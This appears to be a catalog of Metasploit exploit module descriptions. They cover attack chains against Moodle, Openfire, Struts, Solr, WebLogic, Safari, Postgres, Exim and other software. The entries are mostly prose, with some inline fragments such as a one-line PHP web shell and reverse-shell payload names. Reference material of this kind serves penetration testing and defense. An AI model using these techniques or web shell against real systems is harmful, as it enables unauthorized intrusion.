This module exploits an arbitrary file upload vulnerability in MaraCMS 7.5 and prior in order to execute arbitrary commands. The module first attempts to authenticate to MaraCMS. It then tries to upload a malicious PHP file to the web root via an HTTP POST request to `codebase/handler.php.` If the `php` target is selected, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to this file. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET["cmd"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell. Valid credentials for a MaraCMS `admin` or `manager` account are required. This module has been successfully tested against MaraCMS 7.5 running on Windows Server 2012 (XAMPP server).

multi/http/moodle_spelling_binary_rce
Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user.

Moodle version 3.9, 3.8 to 3.8.3, 3.7 to 3.7.6, 3.5 to 3.5.12 and earlier unsupported versions allow for a teacher to exploit chain to RCE. A bug in the privileges system allows a teacher to add themselves as a manager to their own class. They can then add any other users, and thus look to add someone with manager privileges on the system (not just the class). After adding a system manager, a 'loginas' feature is used to access their account. Next the system is reconfigured to allow for all users to install an addon/plugin. Then a malicious theme is uploaded and creates an RCE. If all of that is a success, we revert permissions for managers to system default and remove our malicoius theme. Manual cleanup to remove students from the class is required. This module was tested against Moodle version 3.9

This module can be used to execute a payload on MoveableType (MT) that exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi), that is used during installation and updating of the platform. The vulnerability arises due to the following properties: 1. This script may be invoked remotely without requiring authentication to any MT instance. 2. Through a crafted POST request, it is possible to invoke particular database migration functions (i.e. functions that bring the existing database up-to-date with an updated codebase) by name and with particular parameters. 3. A particular migration function, core_drop_meta_for_table, allows a class parameter to be set which is used directly in a perl eval statement, allowing perl code injection.

multi/http/openfire_auth_bypass_rce_cve_2023_32315
Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin weaponised with java native payload that triggers an RCE. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the first version on the 4.8 branch, which is version 4.8.0.

multi/http/pentaho_business_server_authbypass_and_ssti
Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x is vulnerable to an authentication bypass (CVE-2022-43939) and a Server Side Template Injection (SSTI) vulnerability (CVE-2022-43769) that can be chained together to achieve unauthenticated code execution as the user running the Pentaho Business Analytics Server. The first vulnerability (CVE-2022-43939) is an authentication bypass which stems from a regex that allows any URL that ends in "/", followed by "require", optionally "-js" or "-cfg", any character, and then the string "js" followed optionally by "?" and then any characters of the attacker's choice. The second (CVE-2022-43769) is a server side template injection. This vulnerability allows RCE by making a GET request to /api/ldap/config/ldapTreeNodeChildren and setting the url parameter to ThymeLeaf template code. By abusing the ability to execute arbitrary Java classes within Thymeleaf templates, an attacker can execute arbitrary commands as the user running the Pentaho Business Analytics Server.

This module exploits an underflow vulnerability in versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on Nginx. Only servers with certains Nginx + PHP-FPM configurations are exploitable. This is a port of the original neex's exploit code (see refs.). First, it detects the correct parameters (Query String Length and custom header length) needed to trigger code execution. This step determines if the target is actually vulnerable (Check method). Then, the exploit sets a series of PHP INI directives to create a file locally on the target, which enables code execution through a query string parameter. This is used to execute normal payload stagers. Finally, this module does some cleanup by killing local PHP-FPM workers (those are spawned automatically once killed) and removing the created local file.

multi/http/playsms_template_injection
This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom PHP template system called 'TPL' which is used in the PlaySMS template engine at `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution. The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection. This module was tested against PlaySMS 1.4 on HackTheBox's Forlic Machine.

multi/http/rails_dynamic_render_code_exec
This module exploits a remote code execution vulnerability in the explicit render method when leveraging user parameters. This module has been tested across multiple versions of Ruby on Rails. The technique used by this module requires the specified endpoint to be using dynamic render paths, such as the following example: def show render params[:id] end Also, the vulnerable target will need a POST endpoint for the TempFile upload, this can literally be any endpoint. This module doesnt use the log inclusion method of exploitation due to it not being universal enough. Instead, a new code injection technique was found and used whereby an attacker can upload temporary image files against any POST endpoint and use them for the inclusion attack. Finally, you only get one shot at this if you are testing with the builtin rails server, use caution.

multi/http/solr_velocity_rce
This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom Velocity template. Currently, this module only supports Solr basic authentication. From the Tenable advisory: An attacker could target a vulnerable Apache Solr instance by first identifying a list of Solr core names. Once the core names have been identified, an attacker can send a specially crafted HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity template parameter in a specially crafted Solr request, leading to RCE.

Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions when running on JDK 9 or above and specifically packaged as a traditional WAR and deployed in a standalone Tomcat instance are vulnerable to remote code execution due to an unsafe data binding used to populate an object from request parameters to set a Tomcat specific ClassLoader. By crafting a request to the application and referencing the org.apache.catalina.valves.AccessLogValve class through the classLoader with parameters such as the following: class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp, an unauthenticated attacker can gain remote code execution.

multi/http/struts2_multi_eval_ognl
The Apache Struts framework, when forced, performs double evaluation of attributes' values assigned to certain tags attributes such as id. It is therefore possible to pass in a value to Struts that will be evaluated again when a tag's attributes are rendered. With a carefully crafted request, this can lead to Remote Code Execution (RCE). This vulnerability is application dependant. A server side template must make an affected use of request data to render an HTML tag attribute.

The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with "action:" or "redirect:", followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms. In Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or "redirectAction:" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.

The vulnerability occurs due to a lack of appropriate validation when uploading a malicious PNG file with embedded PHP code to the /cache/images/ directory on the web server using the vulnerable endpoint /index.php?module=EmailTemplates&action=AttachFiles. Once uploaded to the server, depending on server configuration, the attacker can access the malicious PNG file via HTTP or HTTPS, thereby executing the malicious PHP code and gaining access to the system. This vulnerability does not require authentication because there is a missing authentication check in the loadUser() method in include/MVC/SugarApplication.php. After a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application. Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain access to the underlying operating system as the user that the web services are running as (typically www-data).

By combining both weaknesses, a remote attacker can accomplish remote code execution. Note that this will only work if the target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduces a protection against null byte injection in file names. This module has been tested successfully on version v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid seems to bundle Java 7u40 and above with the Windows package which prevents the vulnerability from being exploited.

This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance. The first is an authentication bypass vulnerability via a file delete in logoff.cgi which resets the admin password back to 'admin' upon a reboot (CVE-2016-7552). The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi interface (CVE-2016-7547). Note: You have the option to use the authentication bypass or not since it requires that the server is rebooted. The password reset will render the authentication useless. Typically, if an administrator cant login, they will bounce the box. Therefore, this module performs a heartbeat request until the box is bounced and then attempts to login and to perform the command injection.

multi/http/uptime_file_upload_1
This module exploits an arbitrary file upload vulnerability found within the Up.Time monitoring server 7.2 and below. A malicious entity can upload a PHP file into the webroot without authentication, leading to arbitrary code execution. Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use exploits/multi/http/uptime_file_upload_2.

multi/http/uptime_file_upload_2
This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0. The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php, which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated by the vendor. Although the mitigation in place will prevent uptime_file_upload_1.rb from working, it can still be bypassed and gain privilege escalation, and allows the attacker to upload file again, and execute arbitrary commands.

This module exploits an unauthenticated OVA file upload and path traversal in VMware vCenter Server to write a JSP payload to a web-accessible directory. Fixed versions are 6.5 Update 3n, 6.7 Update 3l, and 7.0 Update 1c. Note that later vulnerable versions of the Linux appliance aren't exploitable via the webshell technique. Furthermore, writing an SSH public key to /home/vsphere-ui/.ssh/authorized_keys works, but the user's non-existent password expires 90 days after install, rendering the technique nearly useless against production environments. You'll have the best luck targeting older versions of the Linux appliance. The Windows target should work ubiquitously.

This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080. The FQDN must also not resolve to a reserved address (192/172/127/10). The server must also respond to a HEAD request for the payload, prior to getting a GET request. This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts <= 5.3.2. The exploit chain is rather complicated. Authentication is required and 'gd' for PHP is required on the server. Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget. A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded which triggers the plugin to download the payload from our server. Our payload has a 'GIF' header, and a double extension ('.gif.php') allowing for arbitrary PHP code to be executed.

multi/iiop/cve_2023_21839_weblogic_rce
Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes a "ForeignOpaqueReference" class object, deserializes it on the target, and then post deserialization, calls the object's "getReferent()" method, which will make use of the "ForeignOpaqueReference" class's "remoteJNDIName" variable, which is under the attackers control, to do a remote loading of the JNDI address specified by "remoteJNDIName" via the "lookup()" function. This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java code during the instantiation of the object, thereby getting remote code execution as the "oracle" user. This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file, at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate an instance of that class, granting us RCE as the "oracle" user.

This module attempts to gain root privileges with SUID Xorg X11 server versions 1.19.0 < 1.20.3. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS and RHEL systems requires console auth for the user's session to start the Xorg server. Cron launches the payload, so if SELinux is enforcing, exploitation may still be possible, but the module will bail. Xorg must have SUID permissions and may not start if already running. On exploitation a crontab.old backup file will be created by Xorg. This module will remove the .old file and restore crontab after successful exploitation. Failed exploitation may result in a corrupted crontab. On successful exploitation artifacts will be created consistant with starting Xorg and running a cron.

multi/misc/ibm_tm1_unauth_rce
This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows an unauthenticated attacker to perform a configuration overwrite. It starts by querying the Admin server for the available applications, picks one, and then exploits it. You can also provide an application name to bypass this step, and exploit the application directly. The configuration overwrite is used to change an application server authentication method to "CAM", a proprietary IBM auth method, which is simulated by the exploit. The exploit then performs a fake authentication as admin, and finally abuses TM1 scripting to perform a command injection as root or SYSTEM. Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux. Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).

This interaction however, does not require any sort of authentication. This leaves the JVM wide open to remote attackers. Sending specially crafted data to the Java Bridge results in the execution of arbitrary java code.

multi/php/php_unserialize_zval_cookie
This module exploits an integer overflow vulnerability in the unserialize() function of the PHP web server extension. This vulnerability was patched by Stefan in version 4.5.0 and applies all previous versions supporting this function. This particular module targets numerous web applications and is based on the proof of concept provided by Stefan Esser. This vulnerability requires approximately 900k of data to trigger due the multiple Cookie headers requirement. Since we are already assuming a fast network connection, we use a 2Mb block of shellcode for the brute force, allowing quick exploitation for those with fast networks. One of the neat things about this vulnerability is that on x86 systems, the EDI register points into the beginning of the hashtable string. This can be used with an egghunter to quickly exploit systems where the location of a valid "jmp EDI" or "call EDI" instruction is known. The EDI method is faster, but the bandwidth-intensive brute force used by this module is more reliable across a wider range of systems.

multi/postgres/postgres_copy_from_program_cmd_exec
Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with 'pg_execute_server_program' to pipe to and from an external program using COPY. This allows arbitrary command execution as though you have console access. This module attempts to create a new table, then execute system commands in the context of copying the command output into the table. This module should work on all Postgres systems running version 9.3 and above. For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse_perl For Windows Systems, target 2 is used with powershell payloads such as: cmd/windows/powershell_reverse_tcp Alternativly target 3 can be used to execute generic commands, such as a web_delivery meterpreter powershell payload or other customised command.

multi/postgres/postgres_createlang
Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages. Most commonly this is Perl and Python. When enabled, command execution is possible on the host. To execute system commands, loading the "untrusted" version of the language is necessary. This requires a superuser. This is usually postgres. The execution should be platform-agnostic, and has been tested on OS X, Windows, and Linux. This module attempts to load Perl or Python to execute system commands. As this dynamically loads a scripting language to execute commands, it is not necessary to drop a file on the filesystem. Only Postgres 8 and up are supported.

multi/script/web_delivery
This module quickly fires up a web server that serves a payload. The module will provide a command to be run on the target machine based on the selected target. The provided command will download and execute a payload using either a specified scripting language interpreter or "squiblydoo" via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution. This attack vector does not write to disk so it is less likely to trigger AV solutions and will allow privilege escalations supplied by Meterpreter. When using either of the PSH targets, ensure the payload architecture matches the target computer or use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines. Regsvr32 uses "squiblydoo" technique to bypass application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request an .sct file and then execute the included PowerShell command inside of it. Similarly, the pubprn target uses the pubprn.vbs script to request and execute a .sct file. Both web requests (i.e., the .sct file and PowerShell download/execute) can occur on the same port. The SyncAppvPublishingServer target uses SyncAppvPublishingServer.exe Microsoft signed binary to request and execute a PowerShell script. This technique only works on Windows 10 builds <= 1709. "PSH (Binary)" will write a file to the disk, allowing for custom binaries to be served up to be downloaded and executed.

The exploit probably works for all versions <= 1.1pre6. A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd was compiled.

osx/browser/osx_gatekeeper_bypass
This module exploits two CVEs that bypass Gatekeeper. For CVE-2021-30657, this module serves an OSX app (as a zip) that contains no Info.plist, which bypasses gatekeeper in macOS < 11.3. If the user visits the site on Safari, the zip file is automatically extracted, and clicking on the downloaded file will automatically launch the payload. If the user visits the site in another browser, the user must click once to unzip the app, and click again in order to execute the payload. For CVE-2022-22616, this module serves a gzip-compressed zip file with its file header pointing to the `Contents` directory which contains an OSX app. If the user downloads the file via Safari, Safari will automatically decompress the file, removing its `com.apple.quarantine` attribute. Because of this, the file will not require quarantining, bypassing Gatekeeper on MacOS versions below 12.3.

osx/browser/safari_file_policy
This module exploits a vulnerability found in Apple Safari on OS X platform. A policy issue in the handling of file:// URLs may allow arbitrary remote code execution under the context of the user. In order to trigger arbitrary remote code execution, the best way seems to be opening a share on the victim machine first (this can be SMB/WebDav/FTP, or a file format that OS X might automount), and then execute it in /Volumes/[share]. If there's some kind of bug that leaks the victim machine's current username, then it's also possible to execute the payload in /Users/[username]/Downloads/, or else bruteforce your way to getting that information. Please note that non-java payloads (*.sh extension) might get launched by Xcode instead of executing it, in that case please try the Java ones instead.

osx/browser/safari_in_operator_side_effect
This module exploits an incorrect side-effect modeling of the 'in' operator. The DFG compiler assumes that the 'in' operator is side-effect free, however the <embed> element with the PDF plugin provides a callback that can trigger side-effects leading to type confusion (CVE-2020-9850). The type confusion can be used as addrof and fakeobj primitives that then lead to arbitrary read/write of memory. These primitives allow us to write shellcode into a JIT region (RWX memory) containing the next stage of the exploit. The next stage uses CVE-2020-9856 to exploit a heap overflow in CVM Server, and extracts a macOS application containing our payload into /var/db/CVMS. The payload can then be opened with CVE-2020-9801, executing the payload as a user but without sandbox restrictions.

osx/browser/safari_proxy_object_type_confusion
This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233). The JIT region is then replaced with shellcode which loads the second stage. The second stage exploits a logic error in libxpc, which uses command execution via the launchd's "spawn_via_launchd" API (CVE-2018-4404).

Pressing cmd-R in the Editor executes the code without any additional confirmation from the user. By getting the user to press cmd-R in Safari, and by hooking the cmd-key keypress event, a user can be tricked into running arbitrary Applescript code. Gatekeeper should be disabled from Security & Privacy in order to avoid the unidentified Developer prompt.

osx/browser/safari_user_assisted_download_launch
This module abuses some Safari functionality to force the download of a zipped .app OSX application containing our payload. The app is then invoked using a custom URL scheme. At this point, the user is presented with Gatekeeper's prompt: "APP_NAME" is an application downloaded from the internet. Are you sure you want to open it? If the user clicks "Open", the app and its payload are executed. If the user has the "Only allow applications downloaded from Mac App Store and identified developers (on by default on OS 10.8+), the user will see an error dialog containing "can't be opened because it is from an unidentified developer." To work around this issue, you will need to manually build and sign an OSX app containing your payload with a custom URL handler called "openurl". You can put newlines and unicode in your APP_NAME, although you must be careful not to create a prompt that is too tall, or the user will not be able to click the buttons, and will have to either logout or kill the CoreServicesUIAgent process.

This port is inherited across forks: child processes will use the same bootstrap port as the parent. By overwriting the bootstrap port and forking a child processes, we can now gain a MitM position between our child and launchd. To gain root we target the sudo binary and intercept its communication with opendirectoryd, which is used by sudo to verify credentials. We modify the replies from opendirectoryd to make it look like our password was valid.

osx/local/sudo_password_bypass
This module gains a session with root permissions on versions of OS X with sudo binary vulnerable to CVE-2013-1775. Tested working on Mac OS 10.7-10.8.4, and possibly lower versions. If your session belongs to a user with Administrative Privileges (the user is in the sudoers file and is in the "admin group"), and the user has ever run the "sudo" command, it is possible to become the super user by running `sudo -k` and then resetting the system clock to 01-01-1970. This module will fail silently if the user is not an admin, if the user has never run the sudo command, or if the admin has locked the Date/Time preferences. Note: If the user has locked the Date/Time preferences, requests to overwrite the system clock will be ignored, and the module will silently fail. However, if the "Require an administrator password to access locked preferences" setting is not enabled, the Date/Time preferences are often unlocked every time the admin logs in, so you can install persistence and wait for a chance later.

solaris/local/rsh_stack_clash_priv_esc
This module exploits a vulnerability in RSH on unpatched Solaris systems which allows users to gain root privileges. The stack guard page on unpatched Solaris systems is of insufficient size to prevent collisions between the stack and heap memory, aka Stack Clash. This module uploads and executes Qualys' Solaris_rsh.c exploit, which exploits a vulnerability in RSH to bypass the stack guard page to write to the stack and create a SUID root shell. This module has offsets for Solaris versions 11.1 (x86) and Solaris 11.3 (x86). Exploitation will usually complete within a few minutes using the default number of worker threads (10). Occasionally, exploitation will fail. If the target system is vulnerable, usually re-running the exploit will be successful. This module has been tested successfully on Solaris 11.1 (x86) and Solaris 11.3 (x86).

solaris/sunrpc/sadmind_adm_build_path
This module exploits a buffer overflow vulnerability in adm_build_path() function of sadmind daemon. The distributed system administration daemon (sadmind) is the daemon used by Solstice AdminSuite applications to perform distributed system administration operations. The sadmind daemon is started automatically by the inetd daemon whenever a request to invoke an operation is received. The sadmind daemon process continues to run for 15 minutes after the last request is completed, unless a different idle-time is specified with the -i command line option. The sadmind daemon may be started independently from the command line, for example, at system boot time. In this case, the -i option has no effect; sadmind continues to run, even if there are no active requests.

unix/fileformat/imagemagick_delegate
This module exploits a shell command injection in the way "delegates" (commands for converting files) are processed in ImageMagick versions <= 7.0.1-0 and <= 6.9.3-9 (legacy). Since ImageMagick uses file magic to detect file format, you can create a .png (for example) which is actually a crafted SVG (for example) that triggers the command injection. The PostScript (PS) target leverages a Ghostscript -dSAFER bypass (discovered by taviso) to achieve RCE in the Ghostscript delegate. Ghostscript versions 9.18 and later are affected. This target is provided as is and will not be updated to track additional vulns. If USE_POPEN is set to true, a |-prefixed command will be used for the exploit. No delegates are involved in this exploitation.

unix/smtp/exim4_string_format
This module exploits a heap buffer overflow within versions of Exim prior to version 4.69. By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim daemon. The root cause is that no check is made to ensure that the buffer is not full prior to handling '%s' format specifiers within the 'string_vformat' function. In order to trigger this issue, we get our message rejected by sending a message that is too large. This will call into log_write to log rejection headers (which is a default configuration setting). After filling the buffer, a long header string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL FROM' command. By sending a second message, the string we sent will be evaluated with 'expand_string' and arbitrary shell commands can be executed. It is likely that this issue could also be exploited using other techniques such as targeting in-band heap management structures, or perhaps even function pointers stored in the heap. However, these techniques would likely be far more platform specific, more complicated, and less reliable. This bug was original found and reported in December 2008, but was not properly handled as a security issue. Therefore, there was a 2 year lag time between when the issue was fixed and when it was discovered being exploited in the wild. At that point, the issue was assigned a CVE and began being addressed by downstream vendors. An additional vulnerability, CVE-2010-4345, was also used in the attack that led to the discovery of danger of this bug. This bug allows a local user to gain root privileges from the Exim user account. If the Perl interpreter is found on the remote system, this module will automatically exploit the secondary bug as well to get root.

This module exploits a shellshock vulnerability on Qmail, a public domain MTA written in C that runs on Unix systems.

This flaw works on the latest Qmail versions (qmail-1.03 and netqmail-1.06). However, in order to execute code, /bin/sh has to be linked to bash (usually default configuration) and a valid recipient must be set on the RCPT TO field (usually admin@exampledomain.com).

unix/webapp/aerohive_netconfig_lfi_log_poison_rce
This module exploits LFI and log poisoning vulnerabilities (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a build-242466 and older in order to achieve unauthenticated remote code execution as the root user. NetConfig is the Aerohive/Extreme Networks HiveOS administrative webinterface. Vulnerable versions allow for LFI because they rely on a version of PHP 5 that is vulnerable to string truncation attacks. This module leverages this issue in conjunction with log poisoning to gain RCE as root. Upon successful exploitation, the Aerohive NetConfig application may hang for as long as the spawned shell remains open. For the Linux target, the MeterpreterTryToFork option (enabled by default) will likely prevent this. If the app hangs, closing the session should render it responsive again. The module provides an automatic cleanup option to clean the log. However, this option is disabled by default because any modifications to the /tmp/messages log, even via sed, may render the target (temporarily) unexploitable. This state can last over an hour. This module has been successfully tested against Aerohive NetConfig versions 8.2r4 and 10.0r7a.

unix/webapp/bolt_authenticated_rce
This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0 and 3.6.* in order to execute arbitrary commands as the user running Bolt. This module first takes advantage of a vulnerability that allows an authenticated user to change the username in /bolt/profile to a PHP `system($_GET[""])` variable. Next, the module obtains a list of tokens from `/async/browse/cache/.sessions` and uses these to create files with the blacklisted `.php` extention via HTTP POST requests to `/async/folder/rename`. For each created file, the module checks the HTTP response for evidence that the file can be used to execute arbitrary commands via the created PHP $_GET variable. If the response is negative, the file is deleted, otherwise the payload is executed via an HTTP get request in this format: `/files/<rogue_PHP_file>?<$_GET_var>=<payload>` Valid credentials for a Bolt CMS user are required. This module has been successfully tested against Bolt CMS 3.7.0 running on CentOS 7.

The file agc/manager_send.php in the VICIdial web application uses unsanitized user input as part of a command that is executed using the PHP passthru() function. A valid username, password and session are needed to access the injection point. Fortunately, VICIdial has two built-in accounts with default passwords and the manager_send.php file has a SQL injection vulnerability that can be used to bypass the session check as long as at least one session has been created at some point in time. In case there isn't any valid session, the user can provide astGUIcient credentials in order to create one. The results of the injected commands are returned as part of the response from the web server. Affected versions include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well.

unix/webapp/wp_easycart_unrestricted_file_upload
WordPress Shopping Cart (WP EasyCart) Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the /inc/amfphp/administration/banneruploaderscript.php script does not properly verify or sanitize user-uploaded files. By uploading a .php file, the remote system will place the file in a user-accessible path. Making a direct request to the uploaded file will allow the attacker to execute the script with the privileges of the web server. In versions <= 3.0.8 authentication can be done by using the WordPress credentials of a user with any role. In later versions, a valid EasyCart admin password will be required that is in use by any admin user. A default installation of EasyCart will setup a user called "demouser" with a preset password of "demouser".

unix/webapp/wp_wysija_newsletters_upload
The Wordpress plugin "MailPoet Newsletters" (wysija-newsletters) before 2.6.8 is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme functionality to upload a zip file containing the payload. The plugin uses the admin_init hook, which is also executed for unauthenticated users when accessing a specific URL. The first fix for this vulnerability appeared in version 2.6.7, but the fix can be bypassed. In PHP's default configuration, a POST variable overwrites a GET variable in the $_REQUEST array. The plugin uses $_REQUEST to check for access rights. By setting the POST parameter to something not beginning with 'wysija_', the check is bypassed. Wordpress uses the $_GET array to determine the page, so it is not affected by this. The developers applied the fixes to all previous versions too.

windows/backupexec/name_service
This module exploits a vulnerability in the Veritas Backup Exec Agent Browser service. This vulnerability occurs when a recv() call has a length value too long for the destination stack buffer. By sending an agent name value of 63 bytes or more, we can overwrite the return address of the recv function. Since we only have ~60 bytes of contiguous space for shellcode, a tiny findsock payload is sent which uses a hardcoded IAT address for the recv() function. This payload will then roll the stack back to the beginning of the page, recv() the real shellcode into it, and jump to it. This module has been tested against Veritas 9.1 SP0, 9.1 SP1, and 8.6.

windows/backupexec/ssl_uaf
This module exploits a use-after-free vulnerability in the handling of SSL NDMP connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL is re-established on a NDMP connection that previously has had SSL established, the BIO struct for the connection's previous SSL session is reused, even though it has previously been freed. This module supports 3 specific versions of the Backup Exec agent in the 14, 15 and 16 series on 64-bit and 32-bit versions of Windows and has been tested from Vista to Windows 10. The check command can help narrow down what major and minor revision is installed and the precise of version of Windows, but some other information may be required to make a reliable choice of target. NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a reliability of around 85%. On other versions of Windows, reliability is around 35% (due to the need to win a race condition across the network in this case; this may drop further depending on network conditions). The agent is normally installed on all hosts in a domain that need to be backed up, so if one service crashes, try again on another :) Successful exploitation will give remote code execution as the user of the Backup Exec Remote Agent for Windows service, almost always NT AUTHORITY\SYSTEM.

This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23 and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same vulnerability that was used for attacks against Korean based organizations. Specifically, this issue occurs when indexing an array using an arbitrary value, memory can be referenced and later executed. Taking advantage of this issue does not rely on heap spraying as the vulnerability can also be used for information leakage. Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and is very reliable.

Specifically, this issue results in uninitialized memory being referenced and later executed. Taking advantage of this issue relies on heap spraying and controlling the uninitialized memory. Currently this exploit works for IE6, IE7, and Firefox 3.6 and likely several other browsers. DEP does catch the exploit and causes it to fail. Due to the nature of the uninitialized memory its fairly difficult to get around this restriction.

windows/browser/aventail_epi_activex
This module exploits a format string vulnerability within version 10.0.4.x and 10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX control (epi.dll). By calling the 'AuthCredential' method with a specially crafted Unicode format string, an attacker can cause memory corruption and execute arbitrary code. Unfortunately, it does not appear to be possible to indirectly re-use existing stack data for more reliable exploitation. This is due to several particulars about this vulnerability. First, the format string must be a Unicode string, which uses two bytes per character. Second, the buffer is allocated on the stack using the 'alloca' function. As such, each additional format specifier (%x) will add four more bytes to the size allocated. This results in the inability to move the read pointer outside of the buffer. Further testing showed that using specifiers that pop more than four bytes does not help. Any number of format specifiers will result in accessing the same value within the buffer. NOTE: It may be possible to leverage the vulnerability to leak memory contents. However, that has not been fully investigated at this time.

windows/browser/ie_setmousecapture_uaf
